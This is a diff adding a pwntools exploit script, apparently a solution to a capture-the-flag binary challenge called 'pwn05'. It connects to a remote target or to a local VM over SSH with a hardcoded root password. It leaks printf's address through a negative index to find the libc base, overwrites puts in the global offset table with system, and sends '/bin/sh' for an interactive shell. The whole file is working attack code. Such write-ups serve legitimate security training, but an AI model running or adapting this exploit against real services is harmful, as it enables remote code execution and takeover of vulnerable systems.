@@ -1,0 +1,54 @@
+from pwn import *
+
+VM_HOST, VM_PORT = "192.168.10.135", 22 # My VM Server
+HOST, PORT = "addr", 1234
+cwd = "/root/workbench/PWN/pwn05"
+
+exe = ELF("./chall_patched",checksec=False)
+libc = ELF("./libc.so.6",checksec=False)
+
+context.binary = exe
+context.log_level = 'debug'
+context.terminal = ["tmux", "splitw", "-h"]
+
+def conn():
+    if args.LOCAL:
+        sh = ssh(host=VM_HOST, port=VM_PORT, user="root", password="password")
+        p = sh.process([f"{cwd}/chall_patched"], cwd=cwd)
+        gdb.attach(p)
+    else:
+        p = remote(HOST, PORT)
+    return p
+
+def main():
+    # === Alias === #
+    p = conn()
+    s = p.send
+    sl = p.sendline
+    sla = p.sendlineafter
+    sa = p.sendafter
+    r = p.recv
+    ru = p.recvuntil
+    rn = p.recvn
+    rl = p.recvline
+    # === Exploit === #
+    log.info("happy pwn!")
+    sla(b"index> ", b"-1")
+    ru(b"value: ")
+    printf_leak = int(rn(14), 16)
+    log.success(f"printf = {hex(printf_leak)}")
+    printf_offset = libc.sym.printf
+    libc.address = printf_leak - printf_offset
+    log.success(f"base = {hex(libc.address)}")
+    puts_got = exe.got.puts
+    log.success(f"puts@GOT = {hex(puts_got)}")
+    sla(b"address> ", hex(puts_got).encode())
+    system = libc.sym.system
+    log.success(f"system = {hex(system)}")
+    sla(b"value> ", hex(system).encode())
+    sla(b"command> ", b"/bin/sh")
+    # =============== #
+    p.interactive()
+
+if __name__ == "__main__":
+    main()
